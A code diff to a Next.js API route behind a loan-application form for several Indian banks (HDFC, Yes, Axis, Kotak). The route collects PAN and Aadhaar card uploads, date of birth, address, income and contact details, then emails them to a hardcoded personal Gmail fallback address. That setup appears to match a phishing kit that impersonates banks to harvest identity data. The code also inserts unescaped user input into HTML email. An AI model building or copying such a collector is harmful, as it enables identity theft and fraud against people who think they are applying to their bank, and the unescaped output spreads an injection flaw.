@@ -18,41 +18,120 @@ export async function POST(request: NextRequest) {
       consentPersonalizedOffers,
       consentPerfios,
       panCard,
-      aadhaarCard
+      aadhaarCard,
+      /* HDFC single-page form fields */
+      pan,
+      firstName,
+      middleName,
+      lastName,
+      gender,
+      personalEmail,
+      typeOfLoan,
+      addressLine1,
+      addressLine2,
+      addressLine3,
+      pincode,
+      city,
+      state,
+      residenceType,
+      addressDeclaration,
+      employerName,
+      monthlyIncome,
+      monthlyEmis,
+      workEmail,
+      consentEligibility,
     } = body
 
-    // Validate required fields
-    if (!bankId || !mobileNumber || !day || !month || !year || !sourceOfIncome) {
-      return NextResponse.json(
-        { error: 'Missing required fields' },
-        { status: 400 }
-      )
+    // Bank-specific validation
+    if (!bankId) {
+      return NextResponse.json({ error: 'Missing bankId' }, { status: 400 })
+    }
+    if (bankId === 'yes') {
+      const name = body.name
+      const panYes = body.pan
+      if (!name || !panYes || String(panYes).replace(/\s/g, '').length < 10) {
+        return NextResponse.json({ error: 'Name and valid PAN are required' }, { status: 400 })
+      }
+    } else if (bankId === 'axis') {
+      if (!body.nameAsPerPan || !body.companyName) {
+        return NextResponse.json({ error: 'Name and Company name are required' }, { status: 400 })
+      }
+    } else if (bankId === 'kotak') {
+      const phoneRegex = /^[6-9]\d{9}$/
+      if (!body.mobileNumber || !phoneRegex.test(body.mobileNumber)) {
+        return NextResponse.json({ error: 'Valid 10-digit mobile number is required' }, { status: 400 })
+      }
+      if (!body.fullName) {
+        return NextResponse.json({ error: 'Full name is required' }, { status: 400 })
+      }
+    } else {
+      if (!mobileNumber || !day || !month || !year || !sourceOfIncome) {
+        return NextResponse.json(
+          { error: 'Missing required fields' },
+          { status: 400 }
+        )
+      }
+      const phoneRegex = /^[6-9]\d{9}$/
+      if (!phoneRegex.test(mobileNumber)) {
+        return NextResponse.json(
+          { error: 'Invalid phone number. Please enter a valid 10-digit phone number.' },
+          { status: 400 }
+        )
+      }
+      const date = new Date(parseInt(year), parseInt(month) - 1, parseInt(day))
+      if (date.getDate() !== parseInt(day) || date.getMonth() !== parseInt(month) - 1 || date.getFullYear() !== parseInt(year)) {
+        return NextResponse.json(
+          { error: 'Invalid date of birth' },
+          { status: 400 }
+        )
+      }
     }
 
-    // Validate mobile number
-    const phoneRegex = /^[6-9]\d{9}$/
-    if (!phoneRegex.test(mobileNumber)) {
-      return NextResponse.json(
-        { error: 'Invalid phone number. Please enter a valid 10-digit phone number.' },
-        { status: 400 }
-      )
-    }
-
-    // Validate date
-    const dateOfBirth = `${day}/${month}/${year}`
-    const date = new Date(parseInt(year), parseInt(month) - 1, parseInt(day))
-    if (date.getDate() !== parseInt(day) || date.getMonth() !== parseInt(month) - 1 || date.getFullYear() !== parseInt(year)) {
-      return NextResponse.json(
-        { error: 'Invalid date of birth' },
-        { status: 400 }
-      )
-    }
+    const dateOfBirth = (day && month && year) ? `${day}/${month}/${year}` : ''
 
     // Email configuration
     const recipientEmail = process.env.LOAN_EMAIL || 'yamraj26yam@gmail.com'
     const subject = `New ${bankName || 'Bank'} Loan Application`
     
-    // Create email body
+    const fullName = [firstName, middleName, lastName].filter(Boolean).join(' ')
+    const hasHdfcFields = pan || firstName || lastName || personalEmail || addressLine1 || employerName || monthlyIncome
+    const nameYes = body.name
+    const panYes = body.pan
+    const nameAsPerPan = body.nameAsPerPan
+    const companyName = body.companyName
+    const fullNameKotak = body.fullName
+
+    // Create email body (bank-specific sections)
+    const personalSectionYes = bankId === 'yes' && (nameYes || panYes) ? `
+Name: ${nameYes || '-'}
+PAN: ${panYes || '-'}` : ''
+    const personalSectionAxis = bankId === 'axis' && (nameAsPerPan || companyName) ? `
+PAN Number: ${body.pan || '-'}
+Name as per PAN: ${nameAsPerPan || '-'}
+Company Name: ${companyName || '-'}
+Gender: ${body.gender || '-'}
+Date of Birth: ${body.dateOfBirth || '-'}
+Net Monthly Salary: ${body.netMonthlySalary || '-'}
+Salary Bank: ${body.salaryBankAccount || '-'}
+Address: ${body.addressLine1 || ''} ${body.addressLine2 || ''}
+PIN: ${body.pincode || ''} City: ${body.city || ''} State: ${body.state || ''}` : ''
+    const personalSectionKotak = bankId === 'kotak' && (fullNameKotak || body.mobileNumber) ? `
+PAN Number: ${body.pan || '-'}
+Full Name: ${fullNameKotak || '-'}
+Mobile: +91 ${body.mobileNumber || '-'}
+Email: ${body.personalEmail || '-'}
+Employment: ${body.employmentType || '-'}
+Net Monthly Salary: ${body.netMonthlySalary || '-'}
+City: ${body.currentCity || '-'}` : ''
+    const personalSectionDefault = !personalSectionYes && !personalSectionAxis && !personalSectionKotak ? `
+Mobile Number: +91 ${mobileNumber || '-'}
+Date of Birth: ${dateOfBirth || '-'}
+Source of Income: ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}
+${pan ? `PAN: ${pan}` : ''}
+${fullName ? `Full Name: ${fullName}` : ''}
+${gender ? `Gender: ${gender}` : ''}
+${personalEmail ? `Personal Email: ${personalEmail}` : ''}` : ''
+
     const emailBody = `
 New Bank Loan Application
 
@@ -60,10 +139,25 @@ Bank Information:
 Bank: ${bankName || bankId}
 Bank ID: ${bankId}
 
-Personal Information:
-Mobile Number: +91 ${mobileNumber}
-Date of Birth: ${dateOfBirth}
-Source of Income: ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}
+Personal Information:${personalSectionYes}${personalSectionAxis}${personalSectionKotak}${personalSectionDefault}
+
+${hasHdfcFields ? `
+Address:
+${addressLine1 ? `Address Line 1: ${addressLine1}` : ''}
+${addressLine2 ? `Address Line 2: ${addressLine2}` : ''}
+${addressLine3 ? `Address Line 3: ${addressLine3}` : ''}
+${pincode ? `PIN Code: ${pincode}` : ''}
+${city ? `City: ${city}` : ''}
+${state ? `State: ${state}` : ''}
+${residenceType ? `Residence Type: ${residenceType}` : ''}
+Address Declaration: ${addressDeclaration ? 'Yes' : 'No'}
+
+Employment:
+${employerName ? `Employer/Company: ${employerName}` : ''}
+${monthlyIncome ? `Monthly Net Income: ₹${monthlyIncome}` : ''}
+${monthlyEmis ? `Monthly EMIs: ₹${monthlyEmis}` : ''}
+${workEmail ? `Work Email: ${workEmail}` : ''}
+` : ''}
 
 Loan Details:
 ${loanAmount ? `Loan Amount: ₹${parseInt(loanAmount).toLocaleString('en-IN')}` : ''}
@@ -72,7 +166,8 @@ ${tenure ? `Tenure: ${tenure} ${tenureUnit === 'Yr' ? 'Years' : 'Months'}` : ''}
 Consents:
 Personal Data Consent: ${consentPersonalData ? 'Yes' : 'No'}
 Personalized Offers Consent: ${consentPersonalizedOffers ? 'Yes' : 'No'}
-Perfios T&C Consent: ${consentPerfios ? 'Yes' : 'No'}
+${consentPerfios !== undefined ? `Perfios T&C Consent: ${consentPerfios ? 'Yes' : 'No'}` : ''}
+${consentEligibility !== undefined ? `Eligibility & T&C Consent: ${consentEligibility ? 'Yes' : 'No'}` : ''}
 
 ---
 This loan application was submitted through the bank application form.
@@ -144,7 +239,24 @@ Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                 <p><strong>Mobile Number:</strong> +91 ${mobileNumber}</p>
                 <p><strong>Date of Birth:</strong> ${dateOfBirth}</p>
                 <p><strong>Source of Income:</strong> ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}</p>
+                ${pan ? `<p><strong>PAN:</strong> ${pan}</p>` : ''}
+                ${fullName ? `<p><strong>Full Name:</strong> ${fullName}</p>` : ''}
+                ${gender ? `<p><strong>Gender:</strong> ${gender}</p>` : ''}
+                ${personalEmail ? `<p><strong>Personal Email:</strong> ${personalEmail}</p>` : ''}
+                ${typeOfLoan ? `<p><strong>Type of Loan:</strong> ${typeOfLoan}</p>` : ''}
               </div>
+              
+              ${hasHdfcFields && (addressLine1 || employerName) ? `
+              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
+                <h3 style="color: #1e293b; margin-top: 0;">Address & Employment</h3>
+                ${addressLine1 ? `<p><strong>Address:</strong> ${addressLine1}${addressLine2 ? `, ${addressLine2}` : ''}${addressLine3 ? `, ${addressLine3}` : ''}</p>` : ''}
+                ${pincode || city || state ? `<p>${[pincode, city, state].filter(Boolean).join(', ')}</p>` : ''}
+                ${employerName ? `<p><strong>Employer:</strong> ${employerName}</p>` : ''}
+                ${monthlyIncome ? `<p><strong>Monthly Income:</strong> ₹${monthlyIncome}</p>` : ''}
+                ${monthlyEmis ? `<p><strong>Monthly EMIs:</strong> ₹${monthlyEmis}</p>` : ''}
+                ${workEmail ? `<p><strong>Work Email:</strong> ${workEmail}</p>` : ''}
+              </div>
+              ` : ''}
               
               ${loanAmount || tenure ? `
               <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
@@ -158,7 +270,8 @@ Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                 <h3 style="color: #1e293b; margin-top: 0;">Consents</h3>
                 <p><strong>Personal Data Consent:</strong> ${consentPersonalData ? 'Yes' : 'No'}</p>
                 <p><strong>Personalized Offers Consent:</strong> ${consentPersonalizedOffers ? 'Yes' : 'No'}</p>
-                <p><strong>Perfios T&C Consent:</strong> ${consentPerfios ? 'Yes' : 'No'}</p>
+                ${consentPerfios !== undefined ? `<p><strong>Perfios T&C Consent:</strong> ${consentPerfios ? 'Yes' : 'No'}</p>` : ''}
+                ${consentEligibility !== undefined ? `<p><strong>Eligibility & T&C Consent:</strong> ${consentEligibility ? 'Yes' : 'No'}</p>` : ''}
               </div>
               
               ${panCard && panCard.data ? `
